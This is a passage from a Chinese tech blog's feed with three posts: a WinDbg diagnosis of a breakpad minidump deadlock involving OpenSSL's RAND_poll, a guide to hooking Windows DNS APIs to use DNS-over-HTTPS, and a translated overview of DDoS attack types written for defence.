value.</span></span><br><span class="line">WaitForSingleObject(handler_finish_semaphore_, INFINITE);</span><br><span class="line"><span class="keyword">bool</span> status = handler_return_value_;</span><br></pre></td></tr></table></figure></p>
<p>那我们再看下线程ExceptionHandlerThreadMain在干嘛，怎么一直没有完成dmp文件生成，释放信号量？<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; ~<span class="number">4</span>kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="number">02f</span>3f1fc <span class="number">7764</span>db13 <span class="number">00000730</span> <span class="number">00000000</span> <span class="number">00000000</span> ntdll!NtWaitForSingleObject+<span class="number">0x15</span> (FPO: [<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line"><span class="number">02f</span>3f260 <span class="number">7764</span>d9f7 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">03</span>d20000 ntdll!RtlpWaitOnCriticalSection+<span class="number">0x13e</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f288 <span class="number">7764</span>dc78 <span class="number">03</span>d20138 <span class="number">759</span>b9beb <span class="number">00078000</span> ntdll!RtlEnterCriticalSection+<span class="number">0x150</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f364 <span class="number">77643541</span> <span class="number">00001f</span>f8 <span class="number">00002000</span> <span class="number">00000000</span> ntdll!RtlpAllocateHeap+<span class="number">0x159</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f3e8 <span class="number">77647</span>d7b <span class="number">03</span>d20000 <span class="number">00800000</span> <span class="number">00001f</span>f8 ntdll!RtlAllocateHeap+<span class="number">0x23a</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f434 <span class="number">77647271</span> <span class="number">00000388</span> <span class="number">759</span>b9c4b <span class="number">0767</span>d8e0 ntdll!RtlpAllocateUserBlock+<span class="number">0xae</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f4c4 <span class="number">7763e262</span> <span class="number">0767</span>d8e0 <span class="number">02f</span>3faac <span class="number">02f</span>3faac ntdll!RtlpLowFragHeapAllocFromContext+<span class="number">0x802</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f538 <span class="number">73e1</span>bad5 <span class="number">03</span>d20000 <span class="number">00000008</span> <span class="number">00000374</span> ntdll!RtlAllocateHeap+<span class="number">0x206</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f54c <span class="number">73e16</span>d52 <span class="number">00000374</span> <span class="number">0767</span>d8e0 <span class="number">02f</span>3faac dbghelp!Win32LiveAllocationProvider::Alloc+<span class="number">0x13</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f560 <span class="number">73e16</span>e96 <span class="number">02f</span>3faac <span class="number">00000374</span> <span class="number">0767</span>d8e0 dbghelp!AllocMemory+<span class="number">0x15</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f598 <span class="number">73e1</span>a261 <span class="number">02f</span>3faac <span class="number">0767</span>d8e0 <span class="number">000018</span>b4 dbghelp!GenAllocateThreadObject+<span class="number">0x2d</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f9c0 <span class="number">73e15</span>b81 <span class="number">02f</span>3faac <span class="number">02f</span>3fb60 <span class="number">02f</span>3fb78 dbghelp!GenGetProcessInfo+<span class="number">0xf2</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3fb40 <span class="number">73e15</span>e2a ffffffff <span class="number">00001</span>bd0 <span class="number">03</span>d207e8 dbghelp!MiniDumpProvideDump+<span class="number">0x16b</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3fba8 <span class="number">6</span>c71101a ffffffff <span class="number">00001</span>bd0 <span class="number">00000728</span> dbghelp!MiniDumpWriteDump+<span class="number">0xf2</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3fc70 <span class="number">6</span>c710db2 <span class="number">00000720</span> <span class="number">00000000</span> ffffffff xxx!google_breakpad::ExceptionHandler::WriteMinidumpWithExceptionForProcess+<span class="number">0x1e3</span> (FPO: [Non-Fpo]) </span><br><span class="line"><span class="number">02f</span>3fc8c <span class="number">6</span>c710875 <span class="number">00000720</span> <span class="number">0061</span>ca54 <span class="number">00000000</span> xxx!google_breakpad::ExceptionHandler::WriteMinidumpWithException+<span class="number">0x43</span> (FPO: [Non-Fpo]) </span><br><span class="line"><span class="number">02f</span>3fca0 <span class="number">770e338</span>a <span class="number">02811098</span> <span class="number">02f</span>3fcec <span class="number">77649</span>a02 xxx!google_breakpad::ExceptionHandler::ExceptionHandlerThreadMain+<span class="number">0x39</span> (FPO: [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]) </span><br><span class="line"><span class="number">02f</span>3fcac <span class="number">77649</span>a02 <span class="number">02811098</span> <span class="number">759</span>b9463 <span class="number">00000000</span> kernel32!BaseThreadInitThunk+<span class="number">0xe</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3fcec <span class="number">776499</span>d5 <span class="number">6</span>c71083c <span class="number">02811098</span> <span class="number">00000000</span> ntdll!__RtlUserThreadStart+<span class="number">0x70</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3fd04 <span class="number">00000000</span> <span class="number">6</span>c71083c <span class="number">02811098</span> <span class="number">00000000</span> ntdll!_RtlUserThreadStart+<span class="number">0x1b</span> (FPO: [Non-Fpo])</span><br></pre></td></tr></table></figure></p>
<p>我们可以看到ExceptionHandlerThreadMain线程果然正在写dmp，但是为什么一直没有完成了？原来是在等待获取一个临界区0x3d20138啊，看下这个临界区被谁占用了呢<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; !cs <span class="number">03</span>d20138 </span><br><span class="line">-----------------------------------------</span><br><span class="line">Critical section   = <span class="number">0x03d20138</span> (+<span class="number">0x3D20138</span>)</span><br><span class="line">DebugInfo          = <span class="number">0x00810238</span></span><br><span class="line">LOCKED</span><br><span class="line">LockCount          = <span class="number">0x1</span></span><br><span class="line">WaiterWoken        = No</span><br><span class="line">OwningThread       = <span class="number">0x00001770</span></span><br><span class="line">RecursionCount     = <span class="number">0x1</span></span><br><span class="line">LockSemaphore      = <span class="number">0x730</span></span><br><span class="line">SpinCount          = <span class="number">0x00000fa0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; ~~[<span class="number">0x1770</span>]</span><br><span class="line">  <span class="number">12</span>  Id: <span class="number">1</span>bd0<span class="number">.1770</span> Suspend: <span class="number">2</span> Teb: <span class="number">7</span>ef93000 Unfrozen</span><br><span class="line">      Priority: <span class="number">0</span>  Priority <span class="keyword">class</span>: <span class="number">32</span></span><br><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; ~<span class="number">12</span>kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="number">03f</span>cf388 <span class="number">776</span>cfbc7 <span class="number">00720000</span> <span class="number">00000005</span> <span class="number">776</span>b4acb ntdll!RtlpQueryExtendedInformationHeap+<span class="number">0x4ec</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">03f</span>cf408 <span class="number">776</span>d079f <span class="number">00000005</span> <span class="number">776</span>b4acb <span class="number">03f</span>cf590 ntdll!RtlpQueryExtendedInformationAllHeaps+<span class="number">0xe5</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">03f</span>cf4f8 <span class="number">7769e2</span>b6 <span class="number">03f</span>cf564 <span class="number">776</span>b4acb <span class="number">00000000</span> ntdll!RtlpQueryExtendedHeapInformation+<span class="number">0xe7</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">03f</span>cf538 <span class="number">776</span>b5163 <span class="number">00000000</span> <span class="number">00000002</span> <span class="number">03f</span>cf564 ntdll!RtlQueryHeapInformation+<span class="number">0x4a</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">03f</span>cf5dc <span class="number">7769374</span>a <span class="number">0</span>a0a0000 <span class="number">770</span>d0000 <span class="number">03f</span>cf6a4 ntdll!RtlQueryProcessHeapInformation+<span class="number">0x288</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">03f</span>cf658 <span class="number">77166093</span> <span class="number">00001</span>bd0 <span class="number">00000014</span> <span class="number">0</span>a0a0000 ntdll!RtlQueryProcessDebugInformation+<span class="number">0x28a</span> (FPO: [Non-Fpo])</span><br><span class="line">*** WARNING: Unable to verify checksum <span class="keyword">for</span> libeay32.dll</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="keyword">export</span> symbols <span class="keyword">for</span> libeay32.dll - </span><br><span class="line"><span class="number">03f</span>cf688 <span class="number">6</span>c38a953 <span class="number">0</span>a0a0000 <span class="number">5205</span>b472 <span class="number">00000001</span> kernel32!Heap32Next+<span class="number">0x4d</span> (FPO: [Non-Fpo])</span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line"><span class="number">03f</span>cf730 <span class="number">7764</span>b83d <span class="number">03f</span>cf7cc <span class="number">00000001</span> <span class="number">751</span>d11e4 libeay32!RAND_poll+<span class="number">0x583</span></span><br><span class="line"><span class="number">03f</span>cf7dc <span class="number">6</span>c331cef <span class="number">0000000</span>a <span class="number">00000001</span> <span class="number">6</span>c408268 ntdll!SbpTraceSbImpl+<span class="number">0x4e</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">03f</span>cf7f4 <span class="number">6</span>c331d3b <span class="number">0000000</span>a <span class="number">00000001</span> <span class="number">6</span>c408268 libeay32!CRYPTO_lock+<span class="number">0x6f</span></span><br><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> libeay32!CRYPTO_add_lock+<span class="number">0x3b</span></span><br></pre></td></tr></table></figure></p>
<p>原来临界区03d20138还在被12号线程线程占用着啊，那为什么一直不释放呢？12号线程也没有获取什么资源啊，通过栈看只是在查询堆信息啊，百思不得其解。看看线程状态呢，Suspend 2表示线程该线程被挂起了2次（不清楚可以看下SuspendThread的MSDN），其中一次是挂调试器引起的，那另外一次呢？ 猜测可能是breakpad或则系统函数在写dmp的过程中执行的，因为通过挂起线程便于保存当前进程线程的上下文到dmp文件中。<br>最终发现是在执行系统函数MiniDumpWriteDump时执行的挂起线程操作。在GenAllocateThreadObject函数中执行SuspendThread挂起线程，在GenFreeProcessObject中执行ResumeThread恢复线程执行。</p>
<p><div align="center"><br><img src="/img/dbghelp_suspend.png" align="center"><br></div><br>到这里死锁的原因已经很清晰了，整个过程如下：<br>1.主线程即0号线程触发异常被breakpad捕获，0号线程通过信号量控制4号线程生成dmp并等待4号线程执行完MiniDumpWriteDump释放信号量。<br>2.4号线程执行MiniDumpWriteDump，在执行过程中会挂起其他线程，挂起其他线程后会执行堆分配操作，这时会获取临界区0x03d20138。<br>3.此刻临界区0x03d20138正被12号线程占有，但是12号线程被4号线程不能释放临界区0x03d20138。</p>
<h2 id="0x02_再探死锁原因">0x02 再探死锁原因</h2><p>这就是一个经典的死锁问题，4号线程和12号线程相互等待，陷入死循环。本以为这时候分析完毕了，但是突然想到12号线程是libeay32的线程为什么会执行堆查询操作呢？直接Google搜一下，第一篇就是libeay32引发的死锁问题(请看第一个参考链接)。<br>帖子中说将openssl版本从原先的0.9.8g升到了目前最新的1.0.0e，问题就可以得到解决，看下我们的版本呢<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0:065&gt; lmvm libeay32</span><br><span class="line">start    end        module name</span><br><span class="line">6c330000 6c45e000   libeay32 C (export symbols)       libeay32.dll</span><br><span class="line">    Loaded symbol image file: libeay32.dll</span><br><span class="line">    Image name: libeay32.dll</span><br><span class="line">    Timestamp:        Fri Jul 24 12:42:20 2015 (55B1C22C)</span><br><span class="line">    CheckSum:         00000000</span><br><span class="line">    ImageSize:        0012E000</span><br><span class="line">    File version:     1.0.2.4</span><br><span class="line">    Product version:  1.0.2.4</span><br><span class="line">    File flags:       0 (Mask 3F)</span><br><span class="line">    File OS:          4 Unknown Win32</span><br><span class="line">    File type:        2.0 Dll</span><br><span class="line">    File date:        00000000.00000000</span><br><span class="line">    Translations:     0409.04b0</span><br><span class="line">    CompanyName:      The OpenSSL Project, http://www.openssl.org/</span><br><span class="line">    ProductName:      The OpenSSL Toolkit</span><br><span class="line">    InternalName:     libeay32</span><br><span class="line">    OriginalFilename: libeay32.dll</span><br><span class="line">    ProductVersion:   1.0.2d</span><br><span class="line">    FileVersion:      1.0.2d</span><br><span class="line">    FileDescription:  OpenSSL Shared Library</span><br><span class="line">    LegalCopyright:   Copyright  ?1998-2005 The OpenSSL Project. Copyright ?1995-1998 Eric A. Young, Tim J. Hudson. All rights reserved.</span><br></pre></td></tr></table></figure></p>
<p>版本已经是1.0.2d了，比帖子中说的版本还新，不行下份源码来看看，在openssl-1.0.2d\crypto\rand\rand_win.c int RAND_poll(void)函数中可以找到相关代码，从相关注释可以看出遍历堆的作用是生成随机数因子，同时RAND_poll中也包含其他几种方式生成随机数因子，如CryptoAPI相关接口，生成成功后通过RAND_add加入到随机数池中。<br>那是不是利用堆遍历生成随机数的方式可以直接删除掉呢？ 本身堆遍历性能就不好，还会增加死锁风险。<br>openssl被应用非常广泛，我们看下行业大厂是怎么用的呢，看线Tim中使用的libeay32.dll，果然利用堆遍历生成随机数的方式被删除掉了，不过删除的不彻底，白Loadlibrary/FreeLibrary kernal32.dll一次。</p>
<h2 id="0x03_解决方案">0x03 解决方案</h2><p>1.彻底解决方案：微软本身就不建议在进程内生成dmp，并说明了进程内生成dmp最大的潜在风险就是死锁。因此使用进程外生成dump方式是最彻底的解决方案，breadpad本身就支持c/s方式生成dmp。<br>2.缓解方案：删除libeay32!RAND_poll堆遍历生成随机数的方案，这样可以减小死锁的风险，该方案本身性能就不好。<br>3.终极解决方案：提高代码质量，我不异常不崩溃就不会写dmp，也就不死锁了，当然这是理想状态，是不可能的。</p>
<h2 id="0x04_参考链接">0x04 参考链接</h2><p>[1] <a href="https://blog.csdn.net/xxin_w/article/details/8805050" target="_blank" rel="external">openssl中libeay32!RAND_poll引发的死锁</a><br>[2] <a href="https://ftp.openssl.org/source/old/1.0.2/" target="_blank" rel="external">openssl 1.02 sourcecode</a><br>[3] <a href="https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump" target="_blank" rel="external">MiniDumpWriteDump MSDN</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_问题介绍">0x00 问题介绍</h2><p>测试反馈测试过程中发现程序进程存在但是界面没加载出来，看现场很快发现是因为版本不匹配而导致程序崩溃，在写dmp的过程中死锁而导致进程卡死，由于程序是卡死而非退出守护进程也未重启程序，最终导致界面一直没加载出来。<br>现象就如上面所说，但是为什么写dmp为什么会导致程序死锁呢？<br>]]>
    
    </summary>
    
      <category term="MiniDumpWriteDump" scheme="http://www.youngroe.com/tags/MiniDumpWriteDump/"/>
    
      <category term="libeay32" scheme="http://www.youngroe.com/tags/libeay32/"/>
    
      <category term="Windows" scheme="http://www.youngroe.com/categories/Windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows客户端如何透明使用DNS-over-HTTPS]]></title>
    <link href="http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/"/>
    <id>http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/</id>
    <published>2018-12-01T12:13:53.000Z</published>
    <updated>2020-03-21T04:24:23.569Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_现有Windows客户端程序dns查询流程">0x00 现有Windows客户端程序dns查询流程</h2><ul>
<li>1.client通过系统api（gethostbyname/getaddrinfo/getaddrinfoex）发起查询dns请求</li>
<li>2.系统api会通过rpc查询本地服务dnscache是否有该host的缓存，如果缓存存在则直接返回返回host对应的ip地址，dns查询完成，如果没有则进入下一步</li>
<li>3.如果不存在该host的缓存，则首先会通过解析本地hosts文件看是否有该host对应的ip，如果存在，则直接返回该ip，否则进入下一步</li>
<li>4.如果本地hosts文件中没有该host的记录，则系统会通过发送dns udp包向本地dns服务器发起请求查询该host对应的ip，后面的dns查询过程如下图所示。<a id="more"></a>
</li>
</ul>
<div align="center"><br><img src="/img/localdns_query.jpg" alt="本地dns解析过程" align="center"><br></div>

<p>简单总结：<br>系统首先会通过本地缓存和hosts文件查询dns，如果缓存和hosts都没有对应的记录，会通过明文udp包向dns服务器查询。具体返回的结果受系统hosts文件及dns服务器影响较大。</p>
<h2 id="0x01_现有dns查询的缺点">0x01 现有dns查询的缺点</h2><p>通过第0x0部分对现有Windows客户端程序dns查询流程的介绍，可以分析出目前dns查询的一些缺陷和风险点。</p>
<p><strong>对使用客户端的用户：</strong><br>跟踪：由于现有dns数据包为端口固定的明文udp包，可以很容易在网络流量中区分dns流量，并解析其中查询的域名信息。这样一些别有用心的人就可以很容易通过解析dns流量分析一个人的浏览习惯，收集敏感信息，特别是大数据火热的今天。<br>欺骗攻击：从开始查询到最终获取到解析结果，现有的dns查询机制需要经历较多过程，由于是明文信息，攻击者可以在任意一个环节修改解析的结果，给一个错误的解析结果，可以阻止用户访问正确的网站或则引入到攻击者想让用户访问的仍以网站。</p>
<p><strong>对于开发客户端的厂商：</strong><br>网络劫持：对于一些页面广告或则其他有收益业务，可能会存在通过业务被dns劫持攻击风险，使业务不可访问或则被替换成其他页面。</p>
<h2 id="0x02_DNS_over_HTTPS是什么？">0x02 DNS over HTTPS是什么？</h2><p> 正式因为目前基于udp查询dns有各种安全缺陷，一些厂商提出了一种安全的dns查询方案DNS over Https，并且已经获得IETF支持，以RFC 8484名义发布。顾名思义DNS over HTTPS是一种通过https协议的Get请求获取域名解析的方案，简称DoH。由于基于http且与普通https请求共用443端口，如果正确部署服务器和客户端程序，理论上很难通过分析https包分析出客户端的域名请求查询结果，也不存在被篡改的风险。</p>
<h2 id="0x03_客户端程序如何透明切换到DoH">0x03 客户端程序如何透明切换到DoH</h2><p>既然DoH相较于基于udp包的dns查询有这么多的优势，那如何将现有的客户端程序切换到DoH呢？<br>我们很容易想到的过程是重写系统域名查询api，然后使用我们重写的api替换掉系统的api。但是这里会存在一个问题，目前的Windows客户端都会使用各种第三方网络库（libcurl、qt network等）及webview引擎（ieframe、libcef、qtwebview等），要想替换掉这些第三方库或则webview引擎中的系统api可能得花费很大的功夫，必须重写这部分代码，然后重新编译（某些库编译异常复杂如libcef）。并且还可能会存在一种情况是某些第三方库我们自己是没代码的，那这部分如何切换到DoH呢？<br>这里有一种不用重编译代码且可以对无代码的第三方库透明切换到使用DoH的简单方法，就是使用hook技术hook 系统dns查询相关系统api实现Windows客户端透明切换到DoH。可能需要hook的api如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">需要hook的api</th>
<th style="text-align:left">影响的其他api</th>
<th style="text-align:left">影响的第三方库</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">GetAddrinfoW</td>
<td style="text-align:left">GetAddrinfoA</td>
<td style="text-align:left">libcurl、qt network、libcef</td>
</tr>
<tr>
<td style="text-align:left">GetAddrinfoExW</td>
<td style="text-align:left">GetAddrinfoExA</td>
<td style="text-align:left">ieframe</td>
</tr>
</tbody>
</table>
<p>当然除了这两个api之外，Windows客户端程序可能还有一些使用其他api的情况（如gethostbyname/DnsQuery）,但是思路相同也是hook替换掉就可以了。<br>在hook函数的实现过程中可能还会遇到一些小问题，如GetAddrinfoW返回结果中的addrinfo内存分配问题。正常情况下返回结果中的addrinfo由GetAddrinfoW函数在其私有堆上分配，然后调用者使用完结果后使用freeaddrinfo释放，但是当我们自己实现的时候很难获取到私有堆的句柄，这样就没办法为addrinfo分配内存，如果使用new分配内存会在freeaddrinfo释放时错误产生问题。我实现的时候通过一个简单粗暴的方式是通过调用原始的GetAddrinfoW解析localhost然后直接使用结果中的addrinfo，因为是GetAddrinfoW分配，所以最后使用freeaddrinfo释放也没问题。<br>除此之外在实现过程中还需要考虑很多其他因素，如dns结果优选、dns缓存设计等软件结构问题，这些可以参考微博的HTTPDNSLib的实现。</p>
<h2 id="0x4_扩展，如何将操作系统切换到DoH">0x4 扩展，如何将操作系统切换到DoH</h2><p>在0x3部分实现单个客户端进程切换到DoH，那怎样将整个Windows系统切换到DoH？<br>其实同样也可以借鉴0x3的思路，替换系统dns服务的查询接口，实现应该是在一个系统服务进程中，具体没研究过。。。。。<br>不过以及有一个更简单的思路，实现一个udp转https的本地接口，然后将Windows网络设置中的dns服务器地址修改为这个本地接口地址，并且已经有人实现了，具体看参考链接4。</p>
<h2 id="0x05_参考链接">0x05 参考链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3ODgyNzcwMw==&amp;mid=201837080&amp;idx=1&amp;sn=b2a152b84df1c7dbd294ea66037cf262&amp;scene=2&amp;from=timeline&amp;isappinstalled=0#rd" target="_blank" rel="external">1.全局精确流量调度新思路-HttpDNS服务详解</a><br><a href="https://github.com/curl/curl/wiki/DNS-over-HTTPS" target="_blank" rel="external">2.DNS over HTTPS</a><br><a href="https://github.com/CNSRE/HTTPDNSLib" target="_blank" rel="external">3.HTTPDNSLib</a><br><a href="https://blog.3bro.info/archives/windows-dns-over-https/" target="_blank" rel="external">4.[教學] 如何透過 cloudflared 使用 DNS-over-HTTPS？（Windows 適用）</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_现有Windows客户端程序dns查询流程">0x00 现有Windows客户端程序dns查询流程</h2><ul>
<li>1.client通过系统api（gethostbyname/getaddrinfo/getaddrinfoex）发起查询dns请求</li>
<li>2.系统api会通过rpc查询本地服务dnscache是否有该host的缓存，如果缓存存在则直接返回返回host对应的ip地址，dns查询完成，如果没有则进入下一步</li>
<li>3.如果不存在该host的缓存，则首先会通过解析本地hosts文件看是否有该host对应的ip，如果存在，则直接返回该ip，否则进入下一步</li>
<li>4.如果本地hosts文件中没有该host的记录，则系统会通过发送dns udp包向本地dns服务器发起请求查询该host对应的ip，后面的dns查询过程如下图所示。]]>
    
    </summary>
    
      <category term="DNS-over-HTTPS" scheme="http://www.youngroe.com/tags/DNS-over-HTTPS/"/>
    
      <category term="getaddrinfo" scheme="http://www.youngroe.com/tags/getaddrinfo/"/>
    
      <category term="Windows" scheme="http://www.youngroe.com/categories/Windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[现代DDoS对抗技术概述（翻译/转载）]]></title>
    <link href="http://www.youngroe.com/2018/10/06/Cybersecurity/ddos-protection-techniques/"/>
    <id>http://www.youngroe.com/2018/10/06/Cybersecurity/ddos-protection-techniques/</id>
    <published>2018-10-06T04:45:15.000Z</published>
    <updated>2020-02-15T08:12:42.951Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>想象一下有人不停的给你打电话，并且你没办法通过加黑名单的方式阻止他，因为他每次都使用了不同的电话号码。你可能会关掉电话，但是这样其他人也不能联系你了，常见的分布式拒绝服务攻击就和这种情况类似。<br>早在乔布斯推出第一部IPhone之前，<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank" rel="external">DDos攻击</a>就已经出现了。因为DDos攻击攻击效果好、易于使用，并且很难追踪，现在依然非常受黑客喜欢。那么我们如何能够防御DDoS攻击呢？在DDOS攻击面前，你能确保为你的web服务器及应用提供高水平的防护么？在本文中我们将讨论如何防止DDoS攻击并介绍一些实践有效的DDoS保护和防御技术。<br><a id="more"></a></p>
<h2 id="0x01_DDoS攻击的类型和方法">0x01 DDoS攻击的类型和方法</h2><p>分布式拒绝服务攻击，简称DDoS是一种旨在使受害者的资源无法使用的协同攻击技术。它可以由一个团队黑客合作发起攻击，也可以由多个连接到互联网上的受害设备发起。这些受攻击者控制的设备通常也被称为僵尸网络。<br>很多工具都可以发起DDoS攻击，Trinoo, Stacheldraht, Shaft, Knight, Mstream等。有这么多易用的工具也是DDoS攻击如此流行的原因之一。</p>
<p><div align="center"><br><img src="/img/DDoS-quote-1.jpg" alt align="center"><br></div><br>一次DDoS攻击可能会持续几分钟到几个小时甚至几天。<a href="https://securelist.com/ddos-report-in-q1-2018/85373/" target="_blank" rel="external">卡巴斯基的报告显示</a>,最近几年持续最长的一次DDos攻击发生在2018年1月，总共持续了近300小时。<br>发起DDoS攻击有两种常见的方法：</p>
<ul>
<li><strong>利用软件漏洞</strong>:黑客可以对有已知或未知的漏洞的软件发送恶意数据包试图使受害者的系统瘫痪。</li>
<li><strong>消耗受害者主机资源或则网络带宽资源</strong>：黑客可以发送大量看起来合法的数据包，从而消耗受害者的网络带宽、CPU或内存直至受害系统无法正常处理合法用户的请求。</li>
</ul>
<p>尽管没有DDoS的标准分类，但是我们可以将他们分为四大类：</p>
<ul>
<li>Volumetric (volume-based)攻击</li>
<li>Protocol attacks</li>
<li>Application attacks</li>
<li>Zero-day attacks<br><div align="center"><br><img src="/img/DDoS-scheme.jpg" alt="DDos攻击常见分类" align="center"><br></div><br>现在我们具体看看每种类型的攻击。</li>
</ul>
<h3 id="Volumetric_attacks(大流量攻击)">Volumetric attacks(大流量攻击)</h3><p>Volumetric attacks试图通过大量的数据量大的网络数据包阻止系统正常的网络访问，通常借助僵尸网络及流量放大技术发起攻击，最常见的Volumetric attacks如下：</p>
<ul>
<li>UDP flood：黑客伪造UDP数据包中的源地址为受害主机发送到大量主机随机端口，这些主机会生成大量的应答包返回给受害主机。</li>
<li>ICMP flood：黑客通过大量的ICMP数据包或则ping，试图耗尽受害服务器的带宽。<br>在2018年，<a href="https://www.netscout.com/news/blog/security-17tbps-ddos-attack-makes-history" target="_blank" rel="external">Netscout</a>报告了迄今为止流量最大的一次DDoS攻击，一家美国服务提供商面临1.7 Tbps规模的reflection/amplification攻击。</li>
</ul>
<h3 id="Protocol_attacks（协议攻击）">Protocol attacks（协议攻击）</h3><p>根据Versign发布的2018年第一季度<a href="https://blog.verisign.com/security/q1-2018-ddos-trends-report-58-percent-of-attacks-employed-multiple-attack-types/" target="_blank" rel="external">DDoS攻击趋势报告</a>，Protocol attacks是通过利用网络协议工作机制弱点进行攻击的一种方式，是第二常见的DDoS攻击方式。常见的Protocol attacks攻击方式如下：</p>
<ul>
<li>SYN flood:黑客利用TCP协议三次握手协议缺陷。客户端发送SYN包给服务端，收到服务端的SYN-ACK包后，不发送ACK包给服务端。这样受害服务器上会留下大量未完成的SYN-ACK请求，从而使得受害服务器资源耗尽（CPU 满负载或内存不足），最终停止服务。</li>
<li>Ping of death:黑客通过ping命令发送超大的网络数据包导致受害主机系统服务中断或则崩溃。<br>SYN flood攻击是<a href="https://www.scmagazine.com/online-gambling-site-hit-by-five-vector-ddos-attack-peaking-at-100gbps/article/538551/" target="_blank" rel="external">2014年用于摧毁在线赌博网站最常使用的5种攻击向量之一</a>。</li>
</ul>
<h3 id="Application_attacks（应用层攻击）">Application attacks（应用层攻击）</h3><p>Application attacks利用了网络协议栈第6、7层中的弱点，针对特定的应用而不是整个服务器进行攻击，他们常见的目标端口和服务是DNS和HTTP服务。最常见的Application attacks攻击如下：</p>
<ul>
<li>HTTP flood：攻击者使用僵尸网络发起标准的大流量的GET和POST请求，由于这些请求看起来是合法的流量，因此检测HTTP flood攻击将是一个巨大的考验。</li>
<li>Slowloris:如名称一样，Slowloris攻击将使受害服务器响应异常缓慢。攻击者通过一定的时间间隔发送HTTP到受害服务器，服务器将一直等待这些请求这些不可能完的请求结束，最终这些不能完成的请求造成受害主机带宽耗尽，合法请求也不能正常到达。<br>2009年大选期间，高级黑客通过Slowloris关闭了伊朗政府网站。</li>
</ul>
